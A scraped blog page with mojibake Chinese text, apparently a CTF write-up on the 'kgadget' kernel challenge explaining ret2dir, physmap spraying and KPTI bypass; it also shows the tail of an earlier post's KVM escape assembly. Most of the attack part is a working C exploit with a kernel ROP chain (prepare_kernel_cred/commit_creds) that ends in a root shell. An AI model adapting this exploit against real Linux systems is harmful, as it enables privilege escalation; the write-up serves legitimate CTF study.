class="line">    jne get_libc1</span><br><span class="line"></span><br><span class="line">mov eax, edx</span><br><span class="line">get_libc2:</span><br><span class="line">    out 1,al</span><br><span class="line">    shr eax, 8</span><br><span class="line">    cmp eax, 0</span><br><span class="line">    jne get_libc2</span><br><span class="line"></span><br><span class="line">chang_fastbin_binsh_to_dest:</span><br><span class="line">    mov eax, [0x7100]</span><br><span class="line">    add eax, 0x13670</span><br><span class="line">    sub eax, 0x603000</span><br><span class="line">    mov edx, 0x602032</span><br><span class="line">    mov [eax], edx</span><br><span class="line">    </span><br><span class="line">    mov eax, [0x7100]</span><br><span class="line">    sub eax, 0x603000</span><br><span class="line">    mov edx,  0x6e69622f</span><br><span class="line">    mov [eax], edx</span><br><span class="line">    mov edx, 0x68732f</span><br><span class="line">    mov [eax+4], edx</span><br><span class="line">hlt</span><br><span class="line">gdt_start:</span><br><span class="line">gdt_null:</span><br><span class="line">    dd 0</span><br><span class="line">    dd 0</span><br><span class="line"></span><br><span class="line">gdt_code:</span><br><span class="line">    dw 0xffff</span><br><span class="line">    dw 0x0</span><br><span class="line">    db 0x0</span><br><span class="line">    db 10011010b</span><br><span class="line">    db 11001111b </span><br><span class="line">    db 0x0</span><br><span class="line">gdt_data:</span><br><span class="line">    dw 0xffff</span><br><span class="line">    dw 0x0</span><br><span class="line">    db 0x0</span><br><span class="line">    db 10010010b</span><br><span class="line">    db 11001111b</span><br><span class="line">    db 0</span><br><span class="line"></span><br><span class="line">gdt_stack:</span><br><span class="line">    dw 0xffff</span><br><span class="line">    dw 0x0</span><br><span class="line">    db 0x0</span><br><span class="line">    db 10010010b</span><br><span class="line">    db 01000000b</span><br><span class="line">    db 0</span><br><span class="line">gdt_end:</span><br><span class="line"></span><br><span class="line">gdt_descriptor:</span><br><span class="line">dw gdt_end-gdt_start-1</span><br><span class="line">dd gdt_start</span><br></pre></td></tr></table></figure>

<p>å¼€å¯ä¿æŠ¤æ¨¡å¼å…‰è®¾ç½®æ®µæè¿°è¡¨gdtè¿˜ä¸å¤Ÿï¼Œè¿˜å¾—è®¾ç½®ä¸€äº›æ®µå¯„å­˜å™¨ï¼Œç„¶åkvmä¸€ç›´çˆ†<code>KVM_EXIT_SHUTDOWN</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/05/ret2dir-KPTI/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/05/ret2dir-KPTI/" class="post-title-link" itemprop="url">ret2dir&KPTI</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-06-05 23:16:49 / ä¿®æ”¹æ—¶é—´ï¼š23:17:30" itemprop="dateCreated datePublished" datetime="2022-06-05T23:16:49+08:00">2022-06-05</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ret2dir-amp-KPTI"><a href="#ret2dir-amp-KPTI" class="headerlink" title="ret2dir&amp;KPTI"></a>ret2dir&amp;KPTI</h1><p>è®°å½•ä¸€ä¸‹è¥¿ç”µçš„kgadgetè§£é¢˜è¿‡ç¨‹ä»¥åŠå­¦åˆ°çš„çŸ¥è¯†ç‚¹ï¼Œæ‹–äº†ä¸€ä¸ªå¤šæœˆäº†ï¼Œè¿˜æ˜¯å¾ˆæœ‰è´¨é‡çš„ä¸€é“é¢˜ï¼Œæ˜¯å­¦ä¹ ret2dirå¾ˆå¥½çš„æ¿å­é¢˜ã€‚</p>
<h2 id="0x1-ret2dir"><a href="#0x1-ret2dir" class="headerlink" title="0x1 ret2dir"></a>0x1 ret2dir</h2><h3 id="0x1-1-åŸç†"><a href="#0x1-1-åŸç†" class="headerlink" title="0x1.1 åŸç†"></a>0x1.1 åŸç†</h3><p>è¿™æ˜¯2014å¹´æå‡ºçš„ä¸€ä¸ªæ”»å‡»æ‰‹æ®µï¼Œä¸»è¦æ˜¯çœ‹è®ºæ–‡çš„ç¿»è¯‘ç†è§£çš„ï¼ˆæ´‹æ–‡çœŸçš„çœ‹ä¸ä¸‹å»ï¼‰ï¼Œç†è§£äº†ä»¥året2dirçš„åŸç†ä¹Ÿä¸æ˜¯éå¸¸å¤æ‚ï¼Œä¸»è¦å°±æ˜¯ä¾é å†…æ ¸åœ°å€ç©ºé—´çš„ä¸€æ®µåœ°å€(physmap)å’Œç‰©ç†åœ°å€çº¿æ€§æ˜ å°„é€ æˆçš„åˆ«ååœ°å€æ¥ç»•è¿‡smepå’Œsmapã€‚</p>
<p><img src="https://p1.ssl.qhimg.com/t01b3da93b49c8c210f.png" alt="img"></p>
<p>ä¸Šå›¾æ˜¯å†…æ ¸çš„è™šæ‹Ÿåœ°å€æ®µï¼Œå…¶ä¸­<code>physmap</code>å°±å¤„äº<code>0xffff888000000000 - 0xffffc87fffffffff</code>,è¿™æ®µåœ°å€å¯¹åº”çš„å†…å­˜å¤§å°ä¸€å…±æ˜¯64TBï¼Œåœ¨x86_64ç³»ç»Ÿä¸­ï¼Œphysmapç›´æ¥ä»¥1:1çš„æ–¹å¼è¿›è¡Œæ˜ å°„ï¼Œä»0é¡µè¡¨å¼€å§‹ï¼Œå°†æ•´ä¸ªRAMæ”¾è¿›64Tçš„åŒºåŸŸä¸­ï¼Œæˆ‘ç†è§£çš„å°±æ˜¯64ä½æ¶æ„ä¸‹ï¼Œ<code>physmap</code>æ˜ å°„äº†æ‰€æœ‰çš„ç‰©ç†å†…å­˜ã€‚æ‰€ä»¥ç”¨æˆ·æ€å¯¹åº”çš„ç‰©ç†å†…å­˜ä¹Ÿè¢«<code>physmap</code>æ˜ å°„,è¿™å°±ä¼šé€ æˆåˆ«ååœ°å€çš„å‡ºç°ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç”¨æˆ·æ€å¸ƒç½®å¥½ropæˆ–è€…shellcodeï¼Œç„¶ååœ¨å†…æ ¸æ€é€šè¿‡<code>physmap</code>å°±å¯ä»¥è®¿é—®åˆ°ï¼Œæ­¤æ—¶ä¸ä¼šè§¦å‘smepå’Œsmapï¼Œå› ä¸º<code>physmap</code>æœ¬èº«å°±å¤„äºå†…æ ¸æ€çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå±äºå†…æ ¸æ€çš„å†…å®¹ã€‚</p>
<h3 id="0x1-2-åˆ©ç”¨æ–¹å¼"><a href="#0x1-2-åˆ©ç”¨æ–¹å¼" class="headerlink" title="0x1.2 åˆ©ç”¨æ–¹å¼"></a>0x1.2 åˆ©ç”¨æ–¹å¼</h3><p>ä¸€å…±æœ‰ä¸¤ç§åˆ©ç”¨æ–¹å¼</p>
<p><strong>ç²¾å‡†å‘½ä¸­</strong>:å¯ä»¥é€šè¿‡mmapç”³è¯·ä¸€é¡µå¤§å°çš„å†…å®¹ï¼Œç„¶ååœ¨ä¸Šé¢å†™ä¸Šè‡ªå·±çš„ropæˆ–è€…shellcode.ç„¶åé€šè¿‡kmallocç”³è¯·å †ï¼Œè¿™ä¸ªå †æ¥è‡ªäº<code>physmap</code>çº¿æ€§æ˜ å°„åŒº(physmapçš„å­˜åœ¨å°±æ˜¯æ–¹ä¾¿kmalloc),ç„¶åæ³„éœ²å †çš„åœ°å€ï¼Œå°±å¯ä»¥çŸ¥é“<code>physmap</code>çš„åŸºåœ°å€äº†ï¼Œç„¶åè¿›è¡Œå†…å­˜æœç´¢ï¼Œæ‰¾åˆ°ropæˆ–è€…shellcodeçš„çº¿æ€§æ˜ å°„åœ°å€æ¥getshell.</p>
<p><strong>æ¦‚ç‡å‘½ä¸­</strong>:å­¦åå«<code>physmap spray</code>,é€šè¿‡mmapå¤§é‡çš„é¡µåœ°å€ï¼Œç„¶åå…¨éƒ¨å†™ä¸Šç›¸åŒçš„ropæˆ–è€…shellcode,ç„¶åéšæœºæŒ‘é€‰ä¸€ä¸ª<code>physmap</code>ä¸Šä¸€ä¸ªé¡µåŸºå€è¿›è¡Œåˆ©ç”¨ã€‚åªè¦ç”³è¯·çš„è¶³å¤Ÿå¤šï¼Œå°±æœ‰å¾ˆå¤§æ¦‚ç‡å‘½ä¸­ã€‚</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯é«˜ç‰ˆæœ¬çš„<code>physmap</code>åªæœ‰è¯»å†™æƒé™ï¼Œæ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½æ˜¯rop.</p>
<h2 id="0x2-KPTI"><a href="#0x2-KPTI" class="headerlink" title="0x2 KPTI"></a>0x2 KPTI</h2><p>åšè¿™é“é¢˜çš„æ—¶å€™å®‰æ’å¥½æ­£å¸¸çš„è¿”å›ç”¨æˆ·æ€çš„<code>swapgs</code>å’Œ<code>iretq</code>ï¼Œè¿”å›ç”¨æˆ·æ€åç›´æ¥çˆ†æ®µé”™è¯¯ï¼Œè·³äº†åŠå¤©ä¹Ÿæ²¡è°ƒå‡ºæ¥ä¸ªæ‰€ä»¥ç„¶ï¼Œé—®äº†ç†Šçˆ¹è¯´å’ŒKPTIæœ‰å…³æˆ‘æ‰ååº”è¿‡æ¥ã€‚</p>
<p>LPTIçš„å…·ä½“åŸç†å¯ä»¥å‚çœ‹<a target="_blank" rel="noopener" href="https://blog.csdn.net/pwl999/article/details/112686914">(12æ¡æ¶ˆæ¯) Linux mem 2.3 å†…æ ¸é¡µè¡¨éš”ç¦» (KPTI) è¯¦è§£_pwl999çš„åšå®¢-CSDNåšå®¢_å†…æ ¸é¡µè¡¨éš”ç¦»</a>ï¼Œç»•è¿‡æ–¹å¼å¯ä»¥çœ‹<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006">Linux Kernel KPTIä¿æŠ¤ç»•è¿‡ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>
<p>ç®€è€Œè¨€ä¹‹ï¼Œå¦‚æœå¼€å¯äº†KPTIçš„è¯ï¼Œè¦æƒ³ä»å†…æ ¸æ€è¿›å…¥ç”¨æˆ·æ€ï¼Œè¿˜å¾—è®¾ç½®cr3çš„å€¼ï¼Œè®©å…¶æˆ–ä¸Š0x1000å°±è¡Œï¼Œå¯ä»¥ä½¿ç”¨gadgetæ¥å®Œæˆï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>swapgs_restore_regs_and_return_to_usermode+27</code>æ¥å®Œæˆã€‚</p>
<p>æˆ‘æ¯”è¾ƒç–‘æƒ‘çš„æ˜¯å½“cr3çš„å€¼æŒ‡å‘äº†ç”¨æˆ·æ€çš„PGDä»¥åè¿˜å¾—æ‰§è¡Œå†…æ ¸æ€çš„<code>swapgs</code>å’Œ<code>iretq</code>,ä¸å°±ä¼šåœ¨TLBä¸­æ‰¾ä¸è§å¯¹åº”çš„ç‰©ç†åœ°å€äº†å—ã€‚ğŸ¤”,ç›®å‰æˆ‘è¿˜æ— æ³•è§£ç­”.</p>
<h2 id="0x3-è„šæœ¬"><a href="#0x3-è„šæœ¬" class="headerlink" title="0x3 è„šæœ¬"></a>0x3 è„šæœ¬</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0xffffffff810c92e0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred=<span class="number">0xffffffff810c9540</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rsp_ret=<span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="keyword">size_t</span> add_rsp_0xe8_pop_rbx_rbp_ret=<span class="number">0xffffffff812bd353</span>;</span><br><span class="line"><span class="keyword">size_t</span> add_rsp_0xa0_pop_rbx_r12_r13_rbp_ret=<span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi=<span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="keyword">size_t</span> ret=<span class="number">0xffffffff8110197b</span>;</span><br><span class="line"><span class="keyword">size_t</span> swapgs_pop_rbp_ret=<span class="number">0xffffffff81bb99af</span>;</span><br><span class="line"><span class="keyword">size_t</span> iretq=<span class="number">0xffffffff810002df</span>;</span><br><span class="line"><span class="keyword">size_t</span> mov_rsi_rax_ret=<span class="number">0xffffffff81bbdc9c</span>;</span><br><span class="line"><span class="keyword">size_t</span>  init_cred = <span class="number">0xffffffff82a6b700</span>;</span><br><span class="line"><span class="keyword">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fb0</span> + <span class="number">27</span>;</span><br><span class="line"><span class="comment">// ffffffff81029e51:	48 89 c7             	mov    %rax,%rdi</span></span><br><span class="line"><span class="comment">// ffffffff81029e54:	89 d8                	mov    %ebx,%eax</span></span><br><span class="line"><span class="comment">// ffffffff81029e56:	5b                   	pop    %rbx</span></span><br><span class="line"><span class="comment">// ffffffff81029e57:	5d                   	pop    %rbp</span></span><br><span class="line"><span class="comment">// ffffffff81029e58:	48 09 f8             	or     %rdi,%rax</span></span><br><span class="line"><span class="comment">// ffffffff81029e5b:	c3                   	retq  </span></span><br><span class="line"><span class="keyword">size_t</span> mov_rdi_rax=<span class="number">0xffffffff81029e51</span>;</span><br><span class="line"><span class="keyword">size_t</span> try_hit ;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">void</span> *physmap_spray_arr[<span class="number">16000</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell pk&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp,user_bp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_bp, rbp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rop_chain</span><span class="params">(<span class="keyword">size_t</span> *rop)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> idx=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;idx&lt;(page_size/<span class="number">8</span><span class="number">-0x40</span>);idx++)&#123;</span><br><span class="line">        rop[idx]=add_rsp_0xa0_pop_rbx_r12_r13_rbp_ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(;idx&lt;(page_size/<span class="number">8</span><span class="number">-0x30</span>);idx++)&#123;</span><br><span class="line">        rop[idx]=ret;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[idx++]=pop_rdi;</span><br><span class="line">    rop[idx++]=<span class="number">0</span>;</span><br><span class="line">    rop[idx++]=prepare_kernel_cred;</span><br><span class="line">    rop[idx++]=mov_rdi_rax;</span><br><span class="line">    rop[idx++]=<span class="number">1</span>;</span><br><span class="line">    rop[idx++]=<span class="number">1</span>;</span><br><span class="line">    rop[idx++]=commit_creds;</span><br><span class="line">    rop[idx++]=swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    rop[idx++]=<span class="number">0</span>;</span><br><span class="line">    rop[idx++]=<span class="number">0</span>;</span><br><span class="line">    rop[idx++] = (<span class="keyword">size_t</span>)usr_shell;         <span class="comment">// rip </span></span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">    fd=open(<span class="string">&quot;/dev/kgadget&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open fail\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    physmap_spray_arr[<span class="number">0</span>]=mmap(<span class="literal">NULL</span>,page_size,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!physmap_spray_arr[<span class="number">0</span>])&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;mmap fail\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rop_chain(physmap_spray_arr[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="number">15000</span>;i++)&#123;</span><br><span class="line">        physmap_spray_arr[i]=mmap(<span class="literal">NULL</span>,page_size,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(!physmap_spray_arr[i])&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap fail\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(physmap_spray_arr[i], physmap_spray_arr[<span class="number">0</span>], page_size);</span><br><span class="line">    &#125;</span><br><span class="line">    try_hit= <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x1111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x2222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, 0x3333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, 0x4444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, 0x5555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, 0x6666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x7777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x8888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,  pop_rsp_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,  try_hit;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, try_hit;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x1bf52;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é™¤äº†<code>ret2dir</code>å’Œ<code>KPTI</code>ç»•è¿‡ä»¥å¤–ï¼Œè¿˜å­¦åˆ°äº†ä¸¤ä¸ªé›¶ç¢çš„çŸ¥è¯†</p>
<p><strong>init_cred</strong>:ä¸€èˆ¬ä½¿ç”¨<code>commit_creds(prepare_kernel_cred(0))</code>æ¥å®Œæˆææƒï¼ŒåŸç†å°±æ˜¯<code>prepare_kernel_cred(0)</code>ä¼šè¿”å›ä¸€ä¸ªrootæƒé™çš„credï¼Œç„¶å<code>commit_creds()</code>å°†è¿™ä¸ªæ–°credè®¾ç½®æˆè¿™ä¸ªè¿›ç¨‹çš„cred,è¿™ä¸ªæ¯”è¾ƒéº»çƒ¦çš„ä¸€ç‚¹æ˜¯<code>mov rdi,rax,ret</code>æ¯”è¾ƒéš¾æ‰¾ï¼Œåœ¨å®˜æ–¹wpé‡Œä»–ç›´æ¥ä½¿ç”¨äº†ä¸€ä¸ªcred<code>init_cred</code>ï¼Œè¿™ä¸ªcredæ˜¯ä¸€ä¸ªrootæƒé™çš„cred,æ‰€ä»¥å¯ä»¥ç›´æ¥<code>commit_creds(init_cred)</code>,å…¶ä¸­<code>init_cred</code>å¯ä»¥ç›´æ¥åœ¨<code>/proc/kallsyms</code>ä¸­æ‰¾è§ã€‚</p>
<p><strong>pt_regs</strong>:è¿™æ˜¯ä¸€ä¸ªç”±å¯„å­˜å™¨çš„å€¼ç»„æˆçš„ç»“æ„ä½“</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

